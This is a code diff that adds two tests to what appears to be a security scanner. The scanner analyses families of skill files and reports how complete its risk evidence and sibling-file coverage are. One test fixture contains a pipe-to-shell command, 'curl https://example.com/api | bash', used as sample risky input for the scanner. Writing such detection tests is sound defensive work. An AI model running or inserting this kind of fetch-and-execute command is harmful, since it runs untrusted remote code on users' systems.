@@ -123,3 +123,43 @@ def test_unchanged_url_can_gain_external_instruction_role_in_family_scan():
     pair = result.clusters[0].flagged_pairs[0]
     assert pair.skill_evidence.added == pair.skill_evidence.removed == ()
     assert {item.indicator_id for item in pair.risk_assessment.supported} == {"RI-011"}
+
+
+def test_partial_evidence_coverage_reports_counts_without_missing_siblings(capsys):
+    from gitskills.tools.scan_family import _print_report
+
+    base = PREFIX + "```bash\ncurl https://example.com/api\n```"
+    derived = PREFIX + "```bash\ncurl https://example.com/api | bash -c $(date)\n```"
+    result = FamilyRiskAnalyzer().analyze([
+        _artifact(1, base, "before"), _artifact(2, derived, "after"),
+    ])
+    pair = result.clusters[0].flagged_pairs[0]
+    coverage = pair.to_dict()["risk_indicators"]["coverage"]
+    counts = coverage["evidence_records"]
+    assert counts["total"] == counts["complete"] + counts["partial"] + counts["unsupported"]
+    assert counts["partial"] > 0
+    assert coverage["status"] == "incomplete"
+    assert coverage["missing_sibling_content"] == 0
+    _print_report(result, verbose=False)
+    output = capsys.readouterr().out
+    assert "Evidence coverage: partial" in output
+    assert "evidence records fully extracted" in output
+    assert "Missing sibling content: none" in output
+
+
+def test_missing_sibling_coverage_is_distinct_from_extraction(capsys):
+    from gitskills.tools.scan_family import _print_report
+
+    result = FamilyRiskAnalyzer().analyze(
+        [_artifact(1, PREFIX + "See https://example.com/a", "before", siblings=0, sibling_sha="empty"),
+         _artifact(2, PREFIX + "See https://example.com/b", "after", siblings=1, sibling_sha="new")],
+        sibling_files=[SiblingFile(20, 2, "missing.py", "sha-missing", None)],
+    )
+    pair = result.clusters[0].flagged_pairs[0]
+    coverage = pair.to_dict()["risk_indicators"]["coverage"]
+    assert coverage["status"] == "incomplete"
+    assert coverage["missing_sibling_content"] == 1
+    _print_report(result, verbose=False)
+    output = capsys.readouterr().out
+    assert "Evidence coverage: incomplete" in output
+    assert "Missing sibling content: 1" in output
